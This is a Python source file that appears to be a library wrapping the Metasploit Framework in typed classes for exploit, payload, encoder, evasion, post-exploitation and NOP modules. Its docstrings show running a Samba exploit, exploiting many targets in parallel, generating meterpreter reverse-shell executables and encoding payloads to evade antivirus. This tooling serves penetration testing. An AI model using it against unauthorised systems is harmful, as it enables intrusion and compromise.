"""Type-specific module classes for Metasploit Framework.

This module provides a class hierarchy that exposes only the appropriate API
for each of the 7 MSF module types:

- BaseModule: Shared metadata and options (all types inherit from this)
- AuxiliaryModule: Scanners, fuzzers, servers (run(), actions())
- EncoderModule: Payload encoding/obfuscation (encode())
- EvasionModule: AV/EDR bypass (run(), targets)
- ExploitModule: Vulnerability exploitation (exploit(), check(), targets)
- NopModule: NOP sled generation (generate_sled())
- PayloadModule: Shellcode generation (generate(), to_handler())
- PostModule: Post-exploitation, requires session (run(session))

Example:
    import assassinate

    assassinate.init_msf("/path/to/metasploit-framework")

    # Factory returns appropriate type
    exploit = assassinate.create_module("exploit/linux/samba/is_known_pipename")
    assert isinstance(exploit, assassinate.ExploitModule)
    assert exploit.module_type == "exploit"

    # Type-specific API
    exploit.options.RHOSTS = "192.168.1.100"
    print(exploit.compatible_payloads())  # Only on ExploitModule
    session = exploit.exploit("cmd/unix/interact")
"""

from __future__ import annotations

import asyncio
import logging
from typing import Any, Callable, Dict, List, Mapping, Optional, Union, TYPE_CHECKING

from .options import ModuleOptions
from .console import print_module

# Get logger for this module
logger = logging.getLogger("assassinate.module")

if TYPE_CHECKING:
    from .session import Session

# Type alias for payload parameter
PayloadSpec = Union[str, "PayloadModule"]


# =============================================================================
# BaseModule - Shared functionality for all module types
# =============================================================================


class BaseModule:
    """
    Base class for all MSF module types.

    Provides shared functionality: metadata properties, options access,
    and validation. Type-specific subclasses add their own methods.

    This class should not be instantiated directly - use create_module()
    which returns the appropriate subclass.
    """

    # Class-level set of immutable metadata properties (for documentation)
    _IMMUTABLE_METADATA = frozenset({
        'fullname', 'description', 'author', 'references', 'platform',
        'arch', 'rank', 'license', 'disclosure_date', 'privileged'
    })

    def __init__(self, rust_module):
        """Initialize with the Rust Module wrapper.

        Args:
            rust_module: The Rust Module instance from pyo3 bridge
        """
        self._rust = rust_module
        self._options: Optional[ModuleOptions] = None
        # Cache for immutable metadata - avoids repeated FFI calls
        self._metadata_cache: Dict[str, Any] = {}
        logger.debug(f"BaseModule initialized: {rust_module.fullname()}")

    def _get_cached(self, key: str, getter: Callable[[], Any]) -> Any:
        """Get a cached value, computing it on first access.

        Args:
            key: Cache key name
            getter: Callable to compute the value if not cached

        Returns:
            Cached or freshly computed value
        """
        if key not in self._metadata_cache:
            self._metadata_cache[key] = getter()
        return self._metadata_cache[key]

    # === Module Type ===

    @property
    def module_type(self) -> str:
        """Module type (auxiliary, encoder, evasion, exploit, nop, payload, post)."""
        return self._get_cached('module_type', self._rust.module_type)

    # === Options (attribute-style access) ===

    @property
    def options(self) -> ModuleOptions:
        """Access module options with attribute-style syntax.

        Example:
            module.options.RHOSTS = "192.168.1.100"
            module.options.RPORT = 445
        """
        if self._options is None:
            self._options = ModuleOptions(self._rust)
        return self._options

    # === Metadata Properties (cached - these never change after module creation) ===

    @property
    def fullname(self) -> str:
        """Full module path (e.g., 'exploit/linux/samba/is_known_pipename')."""
        return self._get_cached('fullname', self._rust.fullname)

    @property
    def description(self) -> str:
        """Module description text."""
        return self._get_cached('description', self._rust.description)

    @property
    def author(self) -> List[str]:
        """List of module authors."""
        return self._get_cached('author', self._rust.author)

    @property
    def references(self) -> List[str]:
        """Security references (CVEs, URLs, etc.)."""
        return self._get_cached('references', self._rust.references)

    @property
    def platform(self) -> List[str]:
        """Target platforms (e.g., ['linux', 'unix'])."""
        return self._get_cached('platform', self._rust.platform)

    @property
    def arch(self) -> List[str]:
        """Target architectures (e.g., ['x86', 'x64'])."""
        return self._get_cached('arch', self._rust.arch)

    @property
    def rank(self) -> str:
        """Module reliability rank (excellent, great, good, normal, average, low, manual)."""
        return self._get_cached('rank', self._rust.rank)

    @property
    def license(self) -> str:
        """Module license."""
        return self._get_cached('license', self._rust.license)

    @property
    def disclosure_date(self) -> Optional[str]:
        """Vulnerability disclosure date."""
        return self._get_cached('disclosure_date', self._rust.disclosure_date)

    @property
    def privileged(self) -> bool:
        """Whether module requires privileged access."""
        return self._get_cached('privileged', self._rust.privileged)

    # === Validation ===

    def validate(self) -> bool:
        """Validate all options are correctly configured."""
        try:
            result = self._rust.validate()
            if not result:
                logger.warning(f"Module {self.fullname} validation failed")
            return result
        except Exception as e:
            logger.error(f"Module {self.fullname} validation error: {e}")
            raise

    # === Backward Compatibility ===

    def set_option(self, key: str, value: Any) -> None:
        """Set option value (prefer module.options.KEY = value)."""
        self._rust._set_option(key, str(value))

    def _get_all_options(self) -> dict:
        """Get all currently set options as a dictionary."""
        opts = {}
        try:
            structured = self._rust._options_structured()
            for key in structured:
                val = self._rust._get_option(key)
                if val is not None and val != "":
                    opts[key] = val
        except Exception:
            pass  # Silently ignore errors getting options
        return opts

    def __repr__(self) -> str:
        parts = [f"<{self.__class__.__name__} {self.fullname}"]
        try:
            parts.append(f"({self.rank})")
            if self.platform:
                parts.append(f"platform={','.join(self.platform[:2])}")
        except Exception:
            pass
        return " ".join(parts) + ">"

    def __str__(self) -> str:
        desc = self.description
        if len(desc) > 60:
            desc = desc[:57] + "..."
        return f"{self.fullname} - {desc}"

    def summary(self, full: bool = False) -> str:
        """Get a detailed multi-line summary of this module.

        Args:
            full: If True, show all references and authors without truncation.
                  Default False limits to 10 references and 5 authors.

        Returns:
            Formatted string with full module details including
            description, all options with descriptions, references, and authors.

        Example:
            >>> print(module.summary())       # Truncated
            >>> print(module.summary(full=True))  # Full output
            >>> module.p()       # Shorthand for truncated
            >>> module.p(full=True)  # Shorthand for full
        """
        lines = [
            f"{'═' * 78}",
            f"  {self.fullname}",
            f"{'═' * 78}",
            f"",
            f"  Type: {self.module_type.upper()}    Rank: {self.rank.upper()}",
        ]

        if self.platform:
            lines.append(f"  Platform: {', '.join(self.platform)}")
        if self.arch:
            lines.append(f"  Arch: {', '.join(self.arch)}")

        # Full description with word wrapping
        if self.description:
            lines.append(f"")
            lines.append(f"  Description:")
            desc = self.description.strip()
            for para in desc.split('\n'):
                para = para.strip()
                if not para:
                    lines.append(f"")
                    continue
                while para:
                    if len(para) <= 72:
                        lines.append(f"    {para}")
                        break
                    idx = para[:72].rfind(' ')
                    if idx == -1:
                        idx = 72
                    lines.append(f"    {para[:idx]}")
                    para = para[idx:].lstrip()

        # All options with full details
        try:
            schema = self.options.schema()
            if schema:
                # Separate required and optional
                required_opts = {k: v for k, v in schema.items() if v.get("required")}
                optional_opts = {k: v for k, v in schema.items() if not v.get("required")}

                def format_option(name: str, info: dict) -> list:
                    """Format a single option with all its details."""
                    opt_lines = []
                    current_val = self.options[name]
                    default_val = info.get("default", "")
                    opt_type = info.get("type", "string")
                    opt_desc = info.get("desc", "")

                    # Build value display
                    if current_val:
                        val_display = f'"{current_val}"'
                    elif default_val:
                        val_display = f'(default: "{default_val}")'
                    else:
                        val_display = "(not set)"

                    # Option header line
                    opt_lines.append(f"    {name} [{opt_type}] = {val_display}")

                    # Description with word wrap
                    if opt_desc:
                        desc_text = opt_desc.strip()
                        while desc_text:
                            if len(desc_text) <= 68:
                                opt_lines.append(f"      └─ {desc_text}")
                                break
                            idx = desc_text[:68].rfind(' ')
                            if idx == -1:
                                idx = 68
                            opt_lines.append(f"      └─ {desc_text[:idx]}")
                            desc_text = desc_text[idx:].lstrip()
                            if desc_text:
                                # Continuation lines
                                opt_lines[-1] = opt_lines[-1].replace("└─", "  ")

                    return opt_lines

                # Required options section
                if required_opts:
                    lines.append(f"")
                    lines.append(f"  ┌{'─' * 74}┐")
                    lines.append(f"  │ REQUIRED OPTIONS                                                        │")
                    lines.append(f"  └{'─' * 74}┘")
                    for name, info in required_opts.items():
                        lines.extend(format_option(name, info))

                # Optional options section
                if optional_opts:
                    lines.append(f"")
                    lines.append(f"  ┌{'─' * 74}┐")
                    lines.append(f"  │ OPTIONAL OPTIONS                                                        │")
                    lines.append(f"  └{'─' * 74}┘")
                    for name, info in optional_opts.items():
                        lines.extend(format_option(name, info))

        except Exception as e:
            logger.debug(f"Error getting options schema: {e}")

        # References (CVEs, URLs, etc.)
        if self.references:
            lines.append(f"")
            lines.append(f"  References:")
            ref_limit = None if full else 10
            for ref in self.references[:ref_limit]:
                lines.append(f"    • {ref}")
            if not full and len(self.references) > 10:
                lines.append(f"    ... and {len(self.references) - 10} more")

        # Authors
        if self.author:
            lines.append(f"")
            lines.append(f"  Authors:")
            auth_limit = None if full else 5
            for auth in self.author[:auth_limit]:
                lines.append(f"    • {auth}")
            if not full and len(self.author) > 5:
                lines.append(f"    ... and {len(self.author) - 5} more")

        lines.append(f"{'─' * 78}")
        return "\n".join(lines)

    def p(self, full: bool = False) -> None:
        """Print rich formatted summary.

        Args:
            full: If True, show all references and authors without truncation.
        """
        # Gather option values
        options_values = {}
        try:
            for name in self.options.keys():
                options_values[name] = self.options[name]
        except Exception:
            pass

        print_module(
            fullname=self.fullname,
            module_type=self.module_type,
            rank=self.rank,
            description=self.description,
            platform=self.platform,
            arch=self.arch,
            options_schema=self.options.schema() if hasattr(self, 'options') else None,
            options_values=options_values,
            references=self.references,
            authors=self.author,
            full=full,
        )


# =============================================================================
# ExploitModule - Vulnerability exploitation
# =============================================================================


class ExploitModule(BaseModule):
    """
    Exploit module for vulnerability exploitation.

    Provides methods for running exploits, checking vulnerability status,
    and listing compatible payloads.

    Example:
        exploit = create_module("exploit/linux/samba/is_known_pipename")
        exploit.options.RHOSTS = "192.168.1.100"

        # Check if vulnerable
        if exploit.has_check():
            print(exploit.check())

        # Run exploit
        session = exploit.exploit("cmd/unix/interact")
        if session:
            print(session.run_cmd("whoami"))
    """

    def _extract_payload(
        self,
        payload: PayloadSpec,
        payload_options: Optional[Mapping[str, Any]] = None,
    ) -> str:
        """Extract payload name and apply options to module datastore.

        Handles both string payload names and PayloadModule objects.
        Sets options on the exploit's datastore for use during execution.

        Args:
            payload: Payload name string or configured PayloadModule
            payload_options: Optional dict of options (ignored if payload is PayloadModule)

        Returns:
            Normalized payload name (without "payload/" prefix)
        """
        if isinstance(payload, str):
            payload_name = payload
            # Apply payload_options if provided
            if payload_options:
                for key, value in payload_options.items():
                    self._rust._set_option(key, str(value))
        else:
            # PayloadModule - extract fullname and configured options
            payload_name = payload.fullname
            # MSF expects payload name without "payload/" prefix
            if payload_name.startswith("payload/"):
                payload_name = payload_name[8:]
            # Copy all configured options from payload to exploit's datastore
            payload_opts = payload._get_all_options()
            for key, value in payload_opts.items():
                self._rust._set_option(key, str(value))

        return payload_name

    @property
    def targets(self) -> List[str]:
        """Available exploit targets."""
        targets = self._rust.targets()
        logger.debug(f"targets() -> {len(targets)} targets")
        return targets

    def compatible_payloads(self) -> List[str]:
        """Get list of compatible payload names."""
        logger.debug(f"compatible_payloads() called for {self.fullname}")
        payloads = self._rust.compatible_payloads()
        logger.debug(f"compatible_payloads() -> {len(payloads)} payloads")
        return payloads

    def has_check(self) -> bool:
        """Check if module supports vulnerability checking."""
        result = self._rust.has_check()
        logger.debug(f"has_check() -> {result}")
        return result

    def check(self) -> str:
        """Run vulnerability check against target."""
        logger.info(f"Running vulnerability check: {self.fullname}")
        try:
            result = self._rust.check()
            logger.info(f"Check result for {self.fullname}: {result}")
            return result
        except Exception as e:
            logger.error(f"Check failed for {self.fullname}: {e}")
            raise

    def exploit(
        self,
        payload: PayloadSpec,
        timeout: int = 60,
        job: bool = False,
        payload_options: Optional[Mapping[str, Any]] = None,
    ) -> "Optional[Union[Session, str]]":
        """
        Run exploit and wait for session, or run as background job.

        Args:
            payload: Payload name string (e.g., "cmd/unix/interact") or
                     a configured PayloadModule object
            timeout: Seconds to wait for session (default: 60, ignored if job=True)
            job: If True, run as background job and return job ID immediately
            payload_options: Optional dict of payload options (e.g., {"LHOST": "10.0.0.1"}).
                            These are set on the exploit's datastore before execution.
                            Ignored if payload is a PayloadModule (uses its options instead).

        Returns:
            - If job=False: Session object if successful, None otherwise
            - If job=True: Job ID (str) if job started, None otherwise

        Example:
            # Simple - use payload name with defaults
            session = module.exploit("cmd/unix/interact")

            # With payload options dict
            session = module.exploit(
                "cmd/unix/reverse_bash",
                payload_options={"LHOST": "10.0.0.1", "LPORT": 4444}
            )

            # With configured PayloadModule (extracts options automatically)
            payload = create_module("payload/cmd/unix/reverse_bash")
            payload.options.LHOST = "10.0.0.1"
            payload.options.LPORT = 4444
            session = module.exploit(payload)

            # Run as background job
            job_id = module.exploit("cmd/unix/interact", job=True)
        """
        from .session import Session

        # Extract payload name and apply options
        payload_name = self._extract_payload(payload, payload_options)

        logger.info(
            f"Executing exploit {self.fullname} with payload {payload_name} (job={job}, timeout={timeout}s)"
        )

        try:
            result = self._rust.exploit(payload_name, timeout, job)

            # If job=True, result is job_id (str) or None
            # If job=False, result is PySession or None
            if result is None:
                if job:
                    logger.warning(f"Exploit job failed to start: {self.fullname}")
                else:
                    logger.warning(f"No session obtained from exploit: {self.fullname}")
                return None

            if job:
                logger.info(f"Exploit job started: {self.fullname} (job_id={result})")
                return result  # str job_id

            session = Session(result)
            logger.success(
                f"Session {session.sid} established from {self.fullname}"
            )
            return session
        except Exception as e:
            logger.error(f"Exploit execution failed for {self.fullname}: {e}")
            raise

    async def exploit_async(
        self,
        payload: PayloadSpec,
        timeout: int = 60,
        job: bool = False,
        payload_options: Optional[Mapping[str, Any]] = None,
    ) -> "Optional[Union[Session, str]]":
        """
        Run exploit asynchronously with parallel execution support.

        This method launches the exploit as a background job and polls for
        a session while releasing the Ruby GVL, enabling true parallel
        exploitation of multiple targets.

        Args:
            payload: Payload name string (e.g., "cmd/unix/interact") or
                     a configured PayloadModule object
            timeout: Seconds to wait for session (default: 60, ignored if job=True)
            job: If True, return immediately after job is registered
            payload_options: Optional dict of payload options (e.g., {"LHOST": "10.0.0.1"}).
                            Ignored if payload is a PayloadModule.

        Returns:
            - If job=False: Session object if successful, None otherwise
            - If job=True: Job ID (str) if job started, None otherwise

        Example:
            # Wait for session (default)
            session = await module.exploit_async("cmd/unix/interact")

            # With payload options
            session = await module.exploit_async(
                "cmd/unix/reverse_bash",
                payload_options={"LHOST": "10.0.0.1", "LPORT": 4444}
            )

            # Parallel exploitation of multiple targets
            async def exploit_targets(targets):
                tasks = []
                for target in targets:
                    module = create_module("exploit/linux/samba/is_known_pipename")
                    module.options.RHOSTS = target
                    tasks.append(module.exploit_async("cmd/unix/interact"))
                return await asyncio.gather(*tasks)
        """
        # Extract payload name and apply options (uses shared helper)
        payload_name = self._extract_payload(payload, payload_options)

        if job:
            # Just register the job and return
            logger.info(f"Starting async exploit job: {self.fullname}")
            job_id = self._rust.exploit(payload_name, timeout, True)
            await asyncio.sleep(0)  # Yield to event loop
            if job_id:
                logger.info(f"Async exploit job started: job_id={job_id}")
            else:
                logger.warning("Async exploit job failed to start")
            return job_id

        # Import at runtime to avoid circular imports
        from . import wait_for_new_session, list_sessions
        from .session import Session

        # Track sessions before launching exploit
        existing_sessions = set(list_sessions())
        logger.debug(f"Existing sessions before exploit: {existing_sessions}")

        # Launch exploit as background job (creates Ruby thread)
        logger.info(
            f"Launching async exploit {self.fullname} with payload {payload_name}"
        )
        self._rust.exploit(payload_name, timeout, True)

        # Wait for session with GVL released (allows Ruby threads to run)
        logger.debug(f"Waiting for new session (timeout: {timeout * 1000}ms)")
        session = wait_for_new_session(
            existing_sessions=existing_sessions,
            timeout_ms=timeout * 1000,
            interval_ms=100,
        )

        # Yield to asyncio event loop
        await asyncio.sleep(0)

        if session:
            logger.success(f"Async exploit got session {session.sid}")
        else:
            logger.warning("Async exploit timed out waiting for session")

        return session


# =============================================================================
# AuxiliaryModule - Scanners, fuzzers, servers
# =============================================================================


class AuxiliaryModule(BaseModule):
    """
    Auxiliary module for scanning, fuzzing, and server operations.

    Auxiliary modules don't exploit vulnerabilities directly - they perform
    supporting tasks like port scanning, service enumeration, or running
    fake servers.

    Example:
        scanner = create_module("auxiliary/scanner/portscan/tcp")
        scanner.options.RHOSTS = "192.168.1.0/24"
        scanner.options.PORTS = "22,80,443"

        # Check available actions
        print(scanner.actions())
        print(scanner.default_action())

        # Run the scanner
        scanner.run()
    """

    def actions(self) -> List[str]:
        """Get available actions for this module."""
        actions = self._rust.actions()
        logger.debug(f"actions() -> {actions}")
        return actions

    def default_action(self) -> Optional[str]:
        """Get default action name."""
        action = self._rust.default_action()
        logger.debug(f"default_action() -> {action}")
        return action

    @property
    def action(self) -> Optional[str]:
        """Get current action."""
        return self._rust.action()

    @action.setter
    def action(self, value: str) -> None:
        """Set current action."""
        logger.debug(f"Setting action to: {value}")
        self._rust._set_option("ACTION", value)

    def run(self) -> bool:
        """Run the auxiliary module.

        Returns:
            True if successful, False otherwise
        """
        logger.info(f"Running auxiliary module: {self.fullname}")
        try:
            result = self._rust.run()
            if result:
                logger.info(f"Auxiliary module {self.fullname} completed successfully")
            else:
                logger.warning(f"Auxiliary module {self.fullname} returned false")
            return result
        except Exception as e:
            logger.error(f"Auxiliary module {self.fullname} failed: {e}")
            raise


# =============================================================================
# PostModule - Post-exploitation (requires session)
# =============================================================================


class PostModule(BaseModule):
    """
    Post-exploitation module that operates on an existing session.

    Post modules require an active session to run. They perform tasks like
    gathering credentials, escalating privileges, or pivoting.

    Example:
        # First get a session from an exploit
        exploit = create_module("exploit/linux/samba/is_known_pipename")
        session = exploit.exploit("cmd/unix/interact")

        # Then run post module with the session
        post = create_module("post/multi/gather/env")
        post.run(session)  # Session is REQUIRED
    """

    def actions(self) -> List[str]:
        """Get available actions for this module."""
        actions = self._rust.actions()
        logger.debug(f"actions() -> {actions}")
        return actions

    def default_action(self) -> Optional[str]:
        """Get default action name."""
        action = self._rust.default_action()
        logger.debug(f"default_action() -> {action}")
        return action

    @property
    def action(self) -> Optional[str]:
        """Get current action."""
        return self._rust.action()

    @action.setter
    def action(self, value: str) -> None:
        """Set current action."""
        logger.debug(f"Setting action to: {value}")
        self._rust._set_option("ACTION", value)

    def run(self, session: "Session") -> bool:
        """Run the post module on a session.

        Args:
            session: An active Session object (required)

        Returns:
            True if successful, False otherwise

        Raises:
            TypeError: If session is None or not provided
            ValueError: If session is not alive

        Example:
            post = create_module("post/multi/gather/env")
            post.run(session)
        """
        logger.debug(f"PostModule.run() called with session: {session}")

        if session is None:
            logger.error("PostModule.run() called without session")
            raise TypeError("PostModule.run() requires a session argument")
        if not session.alive:
            logger.error(f"PostModule.run() called with dead session {session.sid}")
            raise ValueError("Session is not alive")

        logger.info(
            f"Running post module {self.fullname} on session {session.sid}"
        )

        # Set SESSION option internally
        self._rust._set_option("SESSION", str(session.sid))

        try:
            result = self._rust.run()
            if result:
                logger.info(
                    f"Post module {self.fullname} completed successfully on session {session.sid}"
                )
            else:
                logger.warning(
                    f"Post module {self.fullname} returned false on session {session.sid}"
                )
            return result
        except Exception as e:
            logger.error(
                f"Post module {self.fullname} failed on session {session.sid}: {e}"
            )
            raise


# =============================================================================
# EvasionModule - AV/EDR bypass
# =============================================================================


class EvasionModule(BaseModule):
    """
    Evasion module for bypassing AV/EDR detection.

    Evasion modules generate payloads designed to evade security software.

    Example:
        evasion = create_module("evasion/windows/applocker_evasion_msbuild")
        evasion.options.LHOST = "192.168.1.100"
        evasion.run()
    """

    @property
    def targets(self) -> List[str]:
        """Available targets."""
        targets = self._rust.targets()
        logger.debug(f"targets() -> {len(targets)} targets")
        return targets

    def compatible_payloads(self) -> List[str]:
        """Get list of compatible payload names (if supported)."""
        logger.debug(f"compatible_payloads() called for {self.fullname}")
        payloads = self._rust.compatible_payloads()
        logger.debug(f"compatible_payloads() -> {len(payloads)} payloads")
        return payloads

    def run(self) -> bool:
        """Run the evasion module.

        Returns:
            True if successful, False otherwise
        """
        logger.info(f"Running evasion module: {self.fullname}")
        try:
            result = self._rust.run()
            if result:
                logger.info(f"Evasion module {self.fullname} completed successfully")
            else:
                logger.warning(f"Evasion module {self.fullname} returned false")
            return result
        except Exception as e:
            logger.error(f"Evasion module {self.fullname} failed: {e}")
            raise


# =============================================================================
# PayloadModule - Shellcode generation
# =============================================================================


class PayloadModule(BaseModule):
    """
    Payload module for generating shellcode.

    Similar to msfvenom, payload modules generate executable payloads
    that can be used standalone or with exploits.

    Example:
        # Generate payload bytes (like msfvenom)
        payload = create_module("payload/windows/x64/meterpreter/reverse_tcp")
        payload.options.LHOST = "192.168.1.100"
        payload.options.LPORT = 4444

        # Generate raw shellcode
        shellcode = payload.generate(format="raw")

        # Or generate executable
        exe_bytes = payload.generate(format="exe")
        with open("payload.exe", "wb") as f:
            f.write(exe_bytes)

        # Optionally start handler to receive callbacks
        handler = payload.to_handler()
    """

    def generate(self, format: str = "raw", **extra_options) -> bytes:
        """Generate payload bytes.

        Args:
            format: Output format. For raw shellcode use "raw".
                   For executable formats: "exe", "elf", "dll", "macho", etc.
                   For source code: "c", "python", "ruby", "hex", "base64", etc.
            **extra_options: Additional options to override module settings

        Returns:
            Generated payload as bytes

        Example:
            # Generate raw shellcode
            shellcode = payload.generate()

            # Generate as C array
            c_code = payload.generate(format="c")

            # Generate with custom LPORT
            shellcode = payload.generate(LPORT=5555)
        """
        from . import forge_payload, forge_formatted

        logger.debug(
            f"generate() called for {self.fullname} (format={format}, extra_options={extra_options})"
        )

        # Collect current module options
        opts = self._get_all_options()
        opts.update(extra_options)
        logger.debug(f"Payload options: {opts}")

        try:
            if format == "raw":
                logger.info(f"Generating raw payload: {self.fullname}")
                result = forge_payload(self.fullname, opts)
                logger.info(f"Generated {len(result)} bytes of raw payload")
                return result
            else:
                # Use forge_formatted for non-raw formats (returns string, encode to bytes)
                logger.info(f"Generating payload {self.fullname} in format: {format}")
                result = forge_formatted(self.fullname, format, "buf", opts)
                if isinstance(result, str):
                    result = result.encode("utf-8")
                logger.info(f"Generated {len(result)} bytes of formatted payload")
                return result
        except Exception as e:
            logger.error(f"Payload generation failed for {self.fullname}: {e}")
            raise

    def to_handler(self) -> "ExploitModule":
        """Create a handler module configured for this payload.

        Creates an exploit/multi/handler configured to receive connections
        from this payload. The handler is NOT started automatically - call
        exploit_job() on the returned module to start it as a background job.

        Returns:
            ExploitModule configured as a handler for this payload

        Example:
            payload = create_module("payload/windows/meterpreter/reverse_tcp")
            payload.options.LHOST = "192.168.1.100"
            payload.options.LPORT = 4444

            # Create and start handler
            handler = payload.to_handler()
            job_id = handler.exploit_job(payload.fullname)

            # Or run blocking
            session = handler.exploit(payload.fullname)
        """
        from . import create_module as _create_module

        logger.info(f"Creating handler for payload: {self.fullname}")

        handler = _create_module("exploit/multi/handler")
        handler.options.PAYLOAD = self.fullname

        # Copy relevant options from payload to handler
        copied_opts = []
        for opt_name in ["LHOST", "LPORT", "RHOST", "RPORT"]:
            try:
                opt_val = self._rust._get_option(opt_name)
                if opt_val is not None:
                    handler._rust._set_option(opt_name, opt_val)
                    copied_opts.append(f"{opt_name}={opt_val}")
            except Exception as e:
                logger.debug(f"Could not copy option {opt_name}: {e}")

        logger.debug(f"Handler configured with: {', '.join(copied_opts)}")
        return handler


# =============================================================================
# EncoderModule - Payload encoding
# =============================================================================


class EncoderModule(BaseModule):
    """
    Encoder module for obfuscating payloads.

    Encoders transform payloads to evade signature-based detection
    and remove bad characters.

    Example:
        encoder = create_module("encoder/x86/shikata_ga_nai")

        # Encode a payload using this encoder
        encoded = encoder.encode_payload("linux/x86/shell_reverse_tcp",
                                         LHOST="10.0.0.1", LPORT=4444)

        # Or use forge_encoded directly (recommended)
        from assassinate import forge_encoded
        encoded = forge_encoded("linux/x86/shell_reverse_tcp",
                               encoder="x86/shikata_ga_nai",
                               iterations=3)
    """

    def encode_payload(
        self,
        payload_name: str,
        iterations: int = 1,
        **options
    ) -> bytes:
        """Encode a payload using this encoder.

        This generates a payload and encodes it using this encoder module.
        For encoding arbitrary bytes, use the lower-level forge_* functions.

        Args:
            payload_name: Full payload path (e.g., "linux/x86/shell_reverse_tcp")
            iterations: Number of encoding iterations (default: 1)
            **options: Payload options (LHOST, LPORT, etc.)

        Returns:
            Encoded payload bytes

        Example:
            encoder = create_module("encoder/x86/shikata_ga_nai")
            encoded = encoder.encode_payload(
                "linux/x86/shell_reverse_tcp",
                iterations=3,
                LHOST="10.0.0.1",
                LPORT=4444
            )
        """
        from . import forge_encoded

        logger.debug(
            f"encode_payload() called: payload={payload_name}, iterations={iterations}, options={options}"
        )

        # Strip 'encoder/' prefix if present in our fullname
        encoder_name = self.fullname
        if encoder_name.startswith("encoder/"):
            encoder_name = encoder_name[8:]  # Remove "encoder/" prefix

        logger.info(
            f"Encoding payload {payload_name} with encoder {encoder_name} ({iterations} iterations)"
        )

        try:
            result = forge_encoded(payload_name, encoder_name, iterations, options or None)
            logger.info(f"Encoded payload: {len(result)} bytes")
            return result
        except Exception as e:
            logger.error(
                f"Encoding failed for {payload_name} with {encoder_name}: {e}"
            )
            raise

    def encode(
        self, data: bytes, badchars: Optional[bytes] = None, iterations: int = 1
    ) -> bytes:
        """Encode raw payload data using this encoder.

        Note: Direct raw byte encoding is not currently supported through the
        bridge. For encoding payloads, use encode_payload() instead, or use
        forge_payload_with_badchars() which auto-selects an encoder.

        Args:
            data: Raw payload bytes to encode
            badchars: Characters to avoid in output
            iterations: Number of encoding iterations

        Raises:
            NotImplementedError: Raw byte encoding requires direct Ruby FFI

        Alternatives:
            # Option 1: Use forge_encoded with a payload name
            from assassinate import forge_encoded
            encoded = forge_encoded("linux/x86/shell_reverse_tcp",
                                   encoder="x86/shikata_ga_nai")

            # Option 2: Auto-select encoder to avoid badchars
            from assassinate import forge_payload_with_badchars
            encoded, encoder_used = forge_payload_with_badchars(
                "linux/x86/shell_reverse_tcp",
                badchars=b"\\x00\\x0a"
            )
        """
        logger.error(
            "encode() called with raw bytes - not supported. Use encode_payload() instead."
        )
        raise NotImplementedError(
            "Direct raw byte encoding is not supported. Use encode_payload() "
            "to encode a payload by name, or use forge_payload_with_badchars() "
            "for automatic encoder selection."
        )


# =============================================================================
# NopModule - NOP sled generation
# =============================================================================


class NopModule(BaseModule):
    """
    NOP module for generating NOP sleds.

    NOP sleds are sequences of no-operation instructions used in
    buffer overflow exploits to increase reliability.

    Example:
        nop = create_module("nop/x86/single_byte")
        sled = nop.generate_sled(100)
    """

    def generate_sled(
        self,
        length: int,
        badchars: Optional[bytes] = None,
        save_registers: Optional[List[str]] = None,
    ) -> bytes:
        """Generate a NOP sled.

        A NOP sled is a sequence of no-operation instructions that can be
        placed before shellcode in buffer overflow exploits. The CPU slides
        through the NOP instructions until it reaches the shellcode.

        Args:
            length: Desired length of the sled in bytes
            badchars: Bytes to avoid in output (e.g., b"\\x00\\x0a\\x0d")
            save_registers: Registers to preserve (e.g., ["eax", "ebx"])

        Returns:
            NOP sled as bytes

        Example:
            # Simple NOP sled
            nop = create_module("nop/x86/single_byte")
            sled = nop.generate_sled(100)
            print(len(sled))  # 100

            # NOP sled avoiding null bytes
            sled = nop.generate_sled(50, badchars=b"\\x00")

            # NOP sled preserving registers
            sled = nop.generate_sled(32, save_registers=["eax", "ebx"])
        """
        logger.debug(
            f"generate_sled() called: length={length}, badchars={badchars}, save_registers={save_registers}"
        )

        # Convert badchars to list of ints for Rust
        bc = list(badchars) if badchars else None

        logger.info(f"Generating NOP sled: {length} bytes using {self.fullname}")

        try:
            result = self._rust.generate_sled(length, bc, save_registers)
            logger.info(f"Generated NOP sled: {len(result)} bytes")
            return result
        except Exception as e:
            logger.error(f"NOP sled generation failed for {self.fullname}: {e}")
            raise
